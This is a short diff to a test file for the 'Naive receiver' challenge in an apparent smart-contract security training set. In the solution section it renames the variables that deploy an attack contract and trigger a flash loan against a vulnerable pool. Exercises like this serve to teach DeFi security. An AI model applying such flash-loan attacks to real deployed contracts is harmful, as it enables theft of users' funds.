@@ -29,9 +29,9 @@ describe('[Challenge] Naive receiver', function () {
     expect(await ethers.provider.getBalance(receiver)).to.eq(ETHER_IN_RECEIVER);
 
     /** CODE YOUR SOLUTION HERE */
-    const ExploiterFactory = await ethers.getContractFactory('NaiveReceiverAttack', deployer);
-    const exploiter = await ExploiterFactory.deploy(pool, receiver);
-    await pool.flashLoan(exploiter, ETH, 10n ** 18n, '0x');
+    const AttackFactory = await ethers.getContractFactory('NaiveReceiverAttack', deployer);
+    const attack = await AttackFactory.deploy(pool, receiver);
+    await pool.flashLoan(attack, ETH, 10n ** 18n, '0x');
 
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
